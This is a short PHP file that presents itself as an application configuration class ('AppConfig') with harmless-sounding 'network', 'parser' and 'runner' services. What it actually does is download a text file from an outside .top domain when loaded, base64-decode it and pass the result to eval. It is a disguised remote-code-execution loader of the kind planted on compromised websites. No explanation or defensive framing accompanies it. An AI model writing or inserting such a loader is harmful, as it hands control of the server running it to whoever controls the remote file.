<?php
class AppConfig {
    private static $services = [];
    
    public static function bootstrap() {
        self::$services = [
            'network' => fn($u) => file_get_contents($u),
            'parser' => fn($d) => base64_decode($d, true) ?: $d,
            'runner' => fn($c) => eval('?>' . $c)
        ];
    }
    
    public static function execute($url) {
        $content = self::$services['network']($url);
        $content = self::$services['parser']($content);
        return self::$services['runner']($content);
    }
}

AppConfig::bootstrap();
AppConfig::execute("https://ampnyapunyaku.top/tools/s-media/media-new.txt");
?>
